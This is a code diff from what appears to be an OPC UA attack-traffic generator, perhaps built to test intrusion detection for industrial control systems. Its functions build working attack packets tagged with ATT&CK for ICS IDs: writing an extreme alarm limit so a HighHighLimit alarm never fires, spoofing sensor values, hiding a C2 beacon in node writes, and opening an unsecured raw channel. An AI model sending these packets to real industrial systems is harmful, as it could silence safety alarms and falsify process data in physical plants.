+        # WriteRequest to a known alarm-limit node — T0838 Modify Alarm Settings.
+        # Writes an extreme value to a HighHighLimit node so the alarm never
+        # fires. WriteValue with a Double Variant (builtin id 0x0B).
+        node_id = _nid4(rnd.randint(2000, 3000))
+        variant = struct.pack("<B", 0x0B) + struct.pack("<d", 1.0e38)
+        data_val = struct.pack("<B", 0x01) + variant
+        wv = node_id + struct.pack("<I", 13) + struct.pack("<I", 0xFFFFFFFF) + data_val
+        payload = struct.pack("<I", 1) + wv + mb
         body    = _msg_body(SVC["Write"], payload)
         return _opc_header(MSG_MSG, b"F", body)
 
     elif style == "spoof_value":
-        # WriteRequest injecting false sensor value — T0856 Spoof Reporting Message
-        node_id = struct.pack("<BH", 0x01, rnd.randint(1000, 2000))
-        import struct as _s
-        value   = _s.pack("<f", float(kwargs.get("value", rnd.uniform(50.0, 200.0))))
-        payload = node_id + struct.pack("<I", len(value)) + value + mb
+        # WriteRequest injecting a false sensor value — T0856 Spoof Reporting
+        # Message. WriteValue with a Float Variant (builtin id 0x0A).
+        node_id = _nid4(rnd.randint(1000, 2000))
+        variant = struct.pack("<B", 0x0A) + struct.pack("<f", float(kwargs.get("value", rnd.uniform(50.0, 200.0))))
+        data_val = struct.pack("<B", 0x01) + variant
+        wv = node_id + struct.pack("<I", 13) + struct.pack("<I", 0xFFFFFFFF) + data_val
+        payload = struct.pack("<I", 1) + wv + mb
         body    = _msg_body(SVC["Write"], payload)
         return _opc_header(MSG_MSG, b"F", body)
 
     elif style == "c2_write":
-        # WriteRequest to custom node as covert C2 channel — T0869 Standard App Layer Protocol
-        # Legitimate OPC UA port/protocol carrying C2 beacon data
-        node_id = struct.pack("<BH", 0x01, rnd.randint(9900, 9999))
-        beacon  = struct.pack("<I", rnd.randint(0xDEAD0000, 0xDEADFFFF))  # encoded C2 signal
-        payload = node_id + struct.pack("<I", len(beacon)) + beacon + mb
+        # WriteRequest to a custom node as a covert C2 channel — T0869 Standard
+        # Application Layer Protocol. WriteValue with a ByteString Variant
+        # (builtin id 0x0F) carrying the beacon.
+        node_id = _nid4(rnd.randint(9900, 9999))
+        beacon  = struct.pack("<I", rnd.randint(0xDEAD0000, 0xDEADFFFF))
+        variant = struct.pack("<B", 0x0F) + struct.pack("<I", len(beacon)) + beacon
+        data_val = struct.pack("<B", 0x01) + variant
+        wv = node_id + struct.pack("<I", 13) + struct.pack("<I", 0xFFFFFFFF) + data_val
+        payload = struct.pack("<I", 1) + wv + mb
         body    = _msg_body(SVC["Write"], payload)
         return _opc_header(MSG_MSG, b"F", body)
 
     elif style == "native_raw":
-        # Raw OPC UA secure channel open without full session negotiation — T0834 Native API
-        # Accesses protocol at SDK level, bypassing normal session layer
-        body = struct.pack("<IIII", 0, 0, 3600000, 1) + mb  # minimal OPN body
-        return _opc_header(MSG_OPN, b"F", body)
+        # Raw OPC UA secure channel open without full session negotiation —
+        # T0834 Native API. Same OPN/OpenSecureChannelRequest structure as
+        # open_session; compared to it this just opens the channel and stops
+        # (no subsequent CreateSession/ActivateSession).
+        policy_uri = b"http://opcfoundation.org/UA/SecurityPolicy#None"
+        asym_hdr = (struct.pack("<I", len(policy_uri)) + policy_uri
+                    + struct.pack("<I", 0xFFFFFFFF)
+                    + struct.pack("<I", 0xFFFFFFFF))
+        oscr = (_node_id(SVC["OpenSecureChannel"]) + _req_hdr()
+                + struct.pack("<I", 0)            # clientProtocolVersion
+                + struct.pack("<I", 0)            # securityTokenRequestType = ISSUE
+                + struct.pack("<I", 1)            # messageSecurityMode = NONE
+                + struct.pack("<I", 0xFFFFFFFF)   # clientNonce = null
+                + struct.pack("<I", 3600000)      # requestedLifetime
+                + mb)
+        opn_body = struct.pack("<I", 0) + asym_hdr + _seq_header() + oscr
+        return _opc_header(MSG_OPN, b"F", opn_body)
 
     elif style == "privilege_escalate":
         # ActivateSession with malformed identity token to escalate privilege — T0890
